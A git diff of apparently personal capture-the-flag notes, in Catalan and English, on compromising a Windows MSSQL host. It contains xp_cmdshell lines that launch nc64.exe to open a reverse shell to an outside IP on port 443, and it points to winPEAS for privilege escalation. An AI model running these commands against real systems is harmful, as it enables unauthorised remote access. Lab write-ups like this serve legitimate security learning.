@@ -8,7 +8,8 @@
 1. Common enumeration
 2. Check `smbclient`
 3. Use `impacket`
-4. Try to execute reverse shell
+4. Try to execute reverse shell and find the user flag.
+5. Privilege Escalation to find root flag.
 
 
 # smbclient
@@ -121,27 +122,23 @@ Verify if  the simple Python HTTP server recibed the request
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe @IP 443"
 ```
 
-Now look bac to the listener to confirme that re
+Now look back to the listener to confirme that reverse shell is working.
+
+The user flag is in the user's Desktop.
 
 ---
 
-Podrem observar que el python que tenim escoltant al port 80 ha rebut una petició de GET.
-
-> Solicitar cmd com a reverse shell al Local
-```sql
-SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.123 443"
-```
-
-El netcat ja haurà rebut la petició de la reverse shell al port 443
-
-![[Pasted image 20220528174933.png]]
+# Privilege Escalation
+## winPEAS
 
 
-Busquem la flag en el sistema i amb un `more` llegim el contingut
+
+
 
 ---
 
 # Privilegie Escalation
+
 Utilitzarem l'eina WinPeas. Primer descarreguem en local i despres la solicitem desde la màquina. 
 (Continuar fent escolta en el port 80 amb python)
 [Link descarrega](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
